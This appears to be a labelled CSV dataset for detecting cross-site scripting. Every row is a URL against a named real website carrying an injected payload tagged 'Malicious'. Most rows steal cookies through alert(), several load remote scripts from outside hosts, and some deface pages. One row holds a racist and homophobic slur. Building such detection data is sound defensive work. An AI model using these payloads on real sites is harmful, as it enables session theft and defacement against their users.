Payloads,Class
http://www.bpbfc.banquepopulaire.fr/rechercher.html?banque=bpbfc&amp;titre=bienvenue&amp;mots=%3cscript%3eal<br>ert%28%27xss%27%29%3c%2fscript%3e&amp;parse=%5btype+function%5d&amp;swapplace=%5btype+function%5d&amp;loadimages<br>=%5btype+function%5d&amp;createloader=%5btype+function%5d&amp;imagegen=%5btype+function%5d&amp;randomnum=15&amp;rand<br>omnumlast=15&amp;container%5fmc=%5flevel0%2econtainer&amp;images%5fxml=%3cgallery+timer%3d%225%22+order%3d%2<br>2random%22+fadetime%3d%223%22+looping%3d%22yes%22+xpos%3d%22140%22+ypos%3d%220%22%3e%3cimage+path%3d<br>%22img%2frotation%2fbandeau%5frotation1%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5<br>frotation2%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation3%2ejpg%22+%2f%3e%3c<br>image+path%3d%22img%2frotation%2fbandeau%5frotation4%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotatio<br>n%2fbandeau%5frotation5%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation6%2ejpg<br>%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation7%2ejpg%22+%2f%3e%3cimage+path%3d%22<br>img%2frotation%2fbandeau%5frotation8%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5fro<br>tation9%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation10%2ejpg%22+%2f%3e%3cim<br>age+path%3d%22img%2frotation%2fbandeau%5frotation11%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation<br>%2fbandeau%5frotation12%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation13%2ejp<br>g%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation14%2ejpg%22+%2f%3e%3cimage+path%3d%<br>22img%2frotation%2fbandeau%5frotation15%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5<br>frotation16%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation17%2ejpg%22+%2f%3e%<br>3cimage+path%3d%22img%2frotation%2fbandeau%5frotation18%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frota<br>tion%2fbandeau%5frotation19%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation20%<br>2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation21%2ejpg%22+%2f%3e%3cimage+path<br>%3d%22img%2frotation%2fbandeau%5frotation22%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbande<br>au%5frotation23%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation24%2ejpg%22+%2f<br>%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation25%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2f<br>rotation%2fbandeau%5frotation26%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotatio<br>n27%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation28%2ejpg%22+%2f%3e%3c%2fgal<br>lery%3e&amp;imagearray=%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+objec<br>t%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bob<br>ject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%<br>5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobje<br>ct+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d<br>%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject<br>+object%5d%2c%5bobject+object%5d&amp;imagedata=%5bobject+object%5d&amp;i=1&amp;thisloader=%5flevel0%2econtainer%<br>2eloader2%5fmc&amp;alphatween=%5btween%5d&amp;timerinterval=7,Malicious
"http://feeds.adobe.com/index.cfm?query=bylanguage&amp;languageid=16&amp;languagename=indonesian}&quot;&gt;&lt;script&gt;al<br>ert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
http://finance.aol.com/usw/quotes/stockscreener?c_mc=cust&amp;c_mc_f=100b!!!(hey%20admin!)%22%3e%3cscrip<br>t%3ealert(document.cookie)%3c/script%3e&amp;c_mc_t=500b%22%3e%3cbody%20background=javascript:%27%22%3e%3<br>cscript%3ealert(navigator.useragent)%3c/script%3e%3e%3c/body%3e&amp;f_per=cust&amp;f_per_f=0&amp;f_per_t=15&amp;r_dv<br>=&amp;r_nor=5&amp;r_off=0&amp;s_off=0by_xados&amp;symbols_together=pg,Malicious
http://www.wosa.co.za/calendar_view.php?id=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://msn.iproperty.com.my/modules/property/listingsearch.aspx?searchtype=ep&propertytype=ar&state=kl&city=%3cscript%3ealert(%27xss%20by%20turkpower%20-%20from%20turkey%20-%20hello%20msn%20malaysia%20:d%27);%3c/script%3e&minprice=0&maxprice=100000000&x=&y=&s=1&r=0,Malicious
http://download.msn.co.kr/search.html?tag=%3cscript%3ealert(1)%3c/script%3e&amp;x=0&amp;y=0,Malicious
http://tajeule.com/index.php?q=http%3a%2f%2fwww.google.fr%2f%22%3e%3cscript%3ealert(/xss/.source)%3c<br>/script%3e,Malicious
http://www.mv.lt/lt/mineraliniai_vandenys/akcijos?item=49&amp;page=%22%3cscript%3ealert(7);%3c/script%3e,Malicious
https://honkibaito.en-japan.com/frontsearch.do?t=1&amp;l=3&amp;area='%3e%22%3e%3cscript/src=http://kusomiso.<br>com/xss.js%3e%3c/script%3e,Malicious
http://cpanel.itdunya.com/phpmyadmin/themes/original/css/theme_right.css.php?right_font_family=%22%3<br>e%3cscript%3ealert(123456)%3c/script%3e,Malicious
http://www.vedanta.edu.in/page.php?id=14&amp;sid=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%<br>3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://notrefamille.femmes.fr.msn.com/v2/membres-inscription/saisie-coordonnees.asp?origine_inscript<br>ion=&amp;service=forums&amp;theme=notrefamille&amp;redirect=%22%3e%3clink%20href=http://starext.by.ru/css.css%20<br>type=text/css%20rel=stylesheet%3e,Malicious
http://geekdictionary.computing.net/define/1337%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/scrip<br>t%3e,Malicious
http://www.komandirovka.ru/search/index.php?q=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script<br>%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://maruta.be/index.fcgi?mode=user_info_mail&amp;user_mail=%22%3e%27%3e%3cscript%3ealert%28%2fxss%2f%<br>29%3c%2fscript%3e,Malicious
http://ozgonewild.com/register.php?ref=%27%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.zdnetasia.com/search/?query=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;c<br>ollection=&amp;x=7&amp;y=2,Malicious
https://bankingportal.sparkasse-hagen.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google.de%3<br>e,Malicious
http://www.gezginler.net/modules/mydownloads/search.php?query=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;,Malicious
http://ms146.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://ebookshare.net/plus/search.php?keyword=%3c/title%3e%3ciframe%20src=http://xssed.com%3e%3c/ifr<br>ame%3e&amp;kwtype=0&amp;go=go,Malicious
http://www.waseda-shop.com/product_info.php/cpath/%22%3e%3chr%3e%3cmarquee%3e%3ch1%3eby%20kusomiso.c<br>om%3c/h1%3e%3c/marquee%3e,Malicious
http://marmarali.biz/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://www.trekstor.de/en/products/detail_mp3.php?pid=66%22%3e%3cscript%3ealert%281337%29%3c/script%<br>3e&amp;page=1,Malicious
http://linuxmafia.com/kb/kernel%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3c<br>marquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
"http://yu.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.irinnews.org/advsearch.asp?recordjump=0&amp;quicksearch=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;,Malicious
http://www.preventconnect.org/cms/search/search.cfm?searchtext=&gt;&lt;script&gt;alert(&quot;xssed by<br>azat&quot;)&lt;/script&gt;&gt;&lt;script&gt;alert(&quot;xssed by azat&quot;)&lt;/script&gt;,Malicious
http://synonyms24.com/?s=%22%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
"http://twittercounter.com/trendmicro?predicted=&quot;&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/scrip<br>t&gt;",Malicious
http://help.travian.cat/index.php?type=faq&amp;mod=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3<br>b%3c%2fscript%3e,Malicious
http://www.autism-awareness.org.uk/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)<br>&lt;/script&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://usr-bin-mom.com/index.php?page=%22%3e%3cscript%3ealert(1337)%3c/script%3e,Malicious
http://www.abusca.com.br/search.asp?q=%3cscript%3ealert%28%22fzero%20rulez%20;%29%22%29%3c/script%3e,Malicious
http://www.ra.rs.gov.br/principal.php?inc=busca&amp;argumento=%22%3e'%3e%3cscript%20src=http://vuln.xsse<br>d.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.odessaonline.com.ua/go.php?dir=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script<br>%3e,Malicious
http://www.agendapro.it/parrucchieri/prenotazione_attivita_multiple.asp?id_s=24&amp;es=&quot;&gt;&lt;script&gt;alert(d<br>ocument.cookie)&lt;/script&gt;,Malicious
http://www.codeur.com/index.php?m=recherche&amp;q=projet&amp;motclef=&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;x=7&amp;y=13,Malicious
http://shop.newline.com/content.xml?cid=howtoorderxxxxx%0a%0a%3c/script%3e%3cscript%20src=http://ha.<br>ckers.org/s.js%3e%3c/script%3e%0a,Malicious
http://www.sfpio-alsace.com/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://blogmile.jp/login.php?next_url=./index.php&amp;pc_mail='%3e%22%3e%3cscript/src=http://kusomiso.co<br>m/xss.js%3e%3c/script%3e&amp;passwd=password&amp;login=%83%8d%83o%83c%83%93,Malicious
http://www.europanet.com.br/site/busca.php?skin=&amp;keyword=%3cscript%3ealert(666)%3c%2fscript%3e+teste,Malicious
http://www.bibel-online.net/suche/?t=totalschaden&lt;script&gt;alert(%2522holy shit -<br>totalschaden%2522)&lt;/script&gt;&amp;submit.x=0&amp;submit.y=0,Malicious
http://citationbox.thomasnet.com/item/displays/stock-displays/tier-004?&amp;amp;seo=&quot;&gt;&lt;script&gt;alert(&quot;max<br>wel&quot;)&lt;/script&gt;,Malicious
http://www.xixixi.jp/xixixi3/index.html?scd=1&amp;qs=%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e&amp;idp=&amp;<br>kno=,Malicious
http://123clasificados.net/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://registration.ge/includes/custom/checkns.php?nsservers=1%3cscript%20%3eprompt%28934165%29%3c%2fscript%3e,Malicious
https://www.firehousenetworks.com/login/ibhp.asp?note=%22%3e%3cscript%3ealert(%22noah%20is%20a%20fag<br>got%20nigger%20bitch!%22)%3c/script%3e,Malicious
http://www.todoumpc.com/igallery34/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com,Malicious
http://hpcgi3.nifty.com/hiwatsuki/a-news/a-news.cgi?date=2007.08.31&amp;cal=%22%3e%27%3e%3c%73%63%72%69%<br>70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%3<br>2%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c<br>%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.gametrailers.com/x062k6.php?p=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%7<br>4%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31<br>%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%<br>31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://directory.oregonstate.edu/?type=search&amp;cn=%22%3e%3ciframe+src%3dhttp%3a%2f%2fgoogle.com%3e,Malicious
http://www.jorts.com/index.cfm?go=photos.results&amp;search=%3cscript%3ealert(document.cookie)%3c/script<br>%3e&amp;submit.x=12&amp;submit.y=11,Malicious
http://www.thenudeboard.com/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://boincstats.com/bam/register.php?email=%22%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e&amp;name=%22%3e%3c<br>h1%3eby%20kusomiso.com%3c/h1%3e,Malicious
http://www.communitysolutionsnetwork.org/board/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(docu<br>ment.cookie)&lt;/script&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://cookingwithsql.com/tinystats/domainlinks.php?thedomain=%3ciframe+src=http://google.com&gt;,Malicious
http://www.germanosauto.com/registration/freesite/register.asp?id=347300&amp;email=germanosautocenter@ya<br>hoo.com&amp;site=4%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3<br>exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://login.kataweb.it/registrazione/m2o/utenteregistrato.jsp?backurl=%22%3e%3cscript%3ealert%28%2f<br>xss+by+redtuning%2f%29%3b%3c%2fscript%3e,Malicious
http://www.metallica.com/timeline.asp?page=tour&amp;id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;html&gt;&lt;<br>input%20type=&quot;file&quot;&gt;&lt;/html&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.inpakkenenwegwezen.nl/site_search.php?zoeken=%22%3e%22%3e%3cscript%3ealert%28123%29%3c%2f<br>script%3e,Malicious
http://www.selectvoyage.com/phpmyannu/search.php3?booleen2=and&amp;mots=%3cscript%3ealert%28%27xylitol_o<br>wn_you%27%29%3c%2fscript%3e&amp;image32.x=3&amp;image32.y=8&amp;action=seek&amp;nb_results2show=10&amp;booleen=or,Malicious
http://kohajone.com/search.php?searchfield=%22%3e%3cscript%3ealert(1);%3c/script%3e,Malicious
http://www.olgunarmut.com/buff10/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://cgi.www5d.biglobe.ne.jp/~ragna/cgi-bin/newsboard/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert<br>%28%27ins%20-%20unkn0wn.eu%27%29%3c%2fscript%3e,Malicious
"http://www.10best.com/pointroll/pointrollads.htm?pub=http://www.google.com?+&amp;redir=%27%3e%3cscript%3<br>ewindow.location=location.search.substring(5,28).concat(document.domain)%3c/script%3e&amp;ad=g235e200510<br>11164320",Malicious
http://www.homepage-total.de/_sitemap/sitemap.php?suche=%22%3e%3cscript%3ealert(1)%3c%2fscript%3e,Malicious
http://www.yarimada.net/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;script&gt;alert(docum<br>ent.cookie)&lt;/script&gt;,Malicious
http://h41111.www4.hp.com/contacthp/webmaster/se/sv/feedback.php?refurl=%22%3e%3ciframe%20src=javasc<br>ript:alert(123)%3e,Malicious
http://mileycyruslovers.wetpaint.com/account/%3e%3cscript%3ealert(%22xss%20by%20azat%22)%3c%2fscript<br>%3e,Malicious
https://www.fmis.army.mil/index.asp?display=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcotic<br>xs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.president-ksgov.net/?id=12,0,0,0,a?searchnews=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(13<br>37)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;submit.x=0&amp;submi<br>t.y=0&amp;submit=search",Malicious
https://portal.stir.ac.uk/security/login.jsp?requrl='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%<br>3e%3cmarquee%3ewhitehat%20forever%3c/marque%3e,Malicious
http://stock.yahoo.co.kr/st2/st15/st1502/st15020301.html?id=1424606&amp;start=%22%3e%3cscript%3ealert%28<br>%2fwww.r3t.n3t.nl%2f%29%3c%2fscript%3e,Malicious
http://www.e-kent.com/content/knowledgebase/kb_home.asp?cat_name=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1<br>&gt;hacked%20by%20trex&lt;/h1&gt;,Malicious
http://www.phsi.harvard.edu/calendar.php?yr=%3ciframe%20src=%22http://xssed.com%22%3e&amp;month=05,Malicious
http://www.energetix.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdo<br>or&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.kaspersky.ine.co.th/resellers/resellers.php?resellername=&quot;&gt;&lt;script&gt;alert(document.cookie)<br>&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://placeads.startribune.com/test/phpinfo.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][<br>][][][][][][][][][][][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3c/script%3e,Malicious
http://www.ekolay.net/dekorasyon/mesajpano/mesajyaz.asp?cat=%22%3e%3cscript%3ealert(&quot;hehe&quot;)%3c/scrip<br>t%3e,Malicious
http://www.fankollektion.de/index.php?scriptlet=cms/shop&amp;id=11&amp;mode=show_article&amp;shopid=8&amp;categoryid<br>=7&amp;articleid=%27%22%3e%3cscript%3ealert(1337)%3c/script%3e,Malicious
http://www.cheater.de/search.php?words=%3c%2ftitle%3e%3cscript%3ealert%28%22xss%22%29%3c%2fscript%3e<br>&amp;platform_name=pc&amp;submit=suche&amp;cmd=search,Malicious
http://www.kashaw.com/igallery33/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.businessonlineindia.com/listings/emailfromboi.asp?tomail=fabritech9@yahoo.com}%3c/style%3<br>e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%2<br>0xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.fastnet.co.uk/index.php?path=%22%3e%3cmarquee%3e%3ch1%3edefaced%20by%20ironzorg%3c/h1%3e%<br>3c/marquee%3e,Malicious
"http://www.travbuddy.com/register.php?mapid=""><script>alert(1);</script>",Malicious
http://www.onlinegamesinn.com/gamesearch.php?gamename=%22%3e%27%3e%3cscript%3ealert(123)%3c/script%3<br>e,Malicious
http://www.expressorder.ru/search.php?number=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscr<br>ipt%3e&amp;x=30&amp;y=16,Malicious
http://www.post.gov.bn/news_detail.php?newsid=%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.govexec.com/story_page.cfm?filepath=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%2<br>8%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37<br>%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%<br>39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://atesliasklar.com/default.asp?hat=search&amp;content=listmembers&amp;searchtype=&quot;&gt;&lt;script&gt;alert(docume<br>nt.cookie)&lt;/script&gt;,Malicious
http://minkaku.goga.co.jp/comment.php?ext_id=4578%20%22%3e%3cscript%3ealert(1);%3c/script%3e%3c%22,Malicious
http://www.data.gouv.fr/content/search?type=data%3c/script%3e%3cscript%3edocument.getelementbyid%28%<br>22headerppal%22%29.innerhtml=%27%3cimg%20src=%22http://www.attendconference.com/blog/wp-content/uplo<br>ads/2011/04/cia.jpg%22%20/%3e%3cp%3eall%20your%20data%20gov%20are%20belong%20to%20you%3c/p%3e%27;%3c<br>/script%3e%3cscript%3e,Malicious
http://www.cafeboomerang.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;ba<br>ckdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.avast.com/i_kat_207.php?lang=leetspeek%22&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/s<br>cript&gt;&lt;x%20",Malicious
http://cinema.lycos.it/ricerca.php?tabella=tutto&amp;query=%3cscript%3ealert%28%22xss+by+scr34m%22%29%3b<br>%3c%2fscript%3e&amp;submit=cerca,Malicious
"http://drugsforyou.net/search.php?search_text=/""><script>alert(1)</script>&i1.x=12&i1.y=14",Malicious
http://www.action-collective.com/action/categorie.php?txt_recherche=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;x=13&amp;y=8&amp;id_cat=0&amp;txt_geo=0,Malicious
http://www.tiefel-landtechnik.de/fabrikate/amazone/default.phtml?woher=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/sc<br>ript&gt;,Malicious
http://www.s-seiko.ed.jp/contact_us/dispdtinfo.asp?prm=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fku<br>somiso%2ecom%2fx%2ejs%3e%3c%2fscript%3e&amp;m_id=2&amp;c_id=2,Malicious
http://suapsi.comune.siena.it/supera/jsp/home.do?sportello=%3e%22%3e%3cscript%3ealert(%22xss%22)%3c/<br>script%3e,Malicious
http://easycomforts.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(/hacker%20<br>safe%20my%20ass/);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0,Malicious
http://www.chnqiang.com/comment/index.php?keyid=1&amp;itemid=69964&amp;title=%3e%3c%2fnoscript%3e%3cscript%3<br>ealert%2876%29%3c%2fscript%3e,Malicious
http://ms121.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.charlottelacrossenews.com/board/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document<br>.cookie)&lt;/script&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://www.eenbaan.nl/banen/zoeken/?keyword=%22%3e%3cscript%3ealert%28'gtadarkdude'%29%3c%2fscript%3<br>e&amp;location=%22%3e%3cscript%3ealert%28'gtadarkdude'%29%3c%2fscript%3e&amp;functiongroup=&amp;postedwithin=&amp;em<br>ptype=,Malicious
http://www.otakushop.it/_privata/ricerca.asp?keywords=%3cscript%3ealert%28%27spam+engines+suck%21%27<br>%29%3c%2fscript%3e%3ca+href%3d&amp;search=ok&amp;x=5,Malicious
http://naurunappula.com/search.php?keywords=%22%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://service.govdelivery.com/service/partner.html?code=%22%3e%3cscript+src=http://starext.by.ru/lt<br>.js%3e,Malicious
http://www.timetoplaymag.com/search/search.php?search=%3cscript%3ealert(document.cookie)%3c/script%3<br>e&amp;submit=,Malicious
http://jas.familyfun.go.com/arts-and-crafts?page=%22%3e%3cscript%3ealert%280%29%3b%3c%2fscript%3e,Malicious
http://directreadout.sci.gsfc.nasa.gov/index.cfm?section=home%22%3e%3cscript%3ealert('xss--%5c%22vin<br>nu%5c%22')%3c/script%3e&amp;page=news,Malicious
http://maestro.ge/?address=archive&month=1&year=1%3cscript%20%3eprompt%28960922%29%3c%2fscript%3e,Malicious
http://www.norden.org/webb/calendar/calendar.asp?showday=1&amp;f_subject=&amp;m_typ='%22%3e%3ch1%3erubberduc<br>k%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarquee%3ewhitehat%20forever%3c/marquee%3e&amp;m_id=&amp;f_startdate=11-04-2007<br>&amp;f_enddate=11-04-2007,Malicious
http://www.esbaptist.org/igallery33/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bizportal.co.il/shukhahon/biznews02.shtml?mid=%22%3e%3cscript%3ealert(document.cookie)%3c<br>/script%3e%3e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
http://496.jp/k&amp;y/cgi/newsboard/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%20-%20unkn0wn.<br>eu%27%29%3c%2fscript%3e,Malicious
http://monagas.tsj.gov.ve/noticias/noticia_detallada.asp?id=%22%3e%3cscript%3ealert(/xssed/);%3c/scr<br>ipt%3e,Malicious
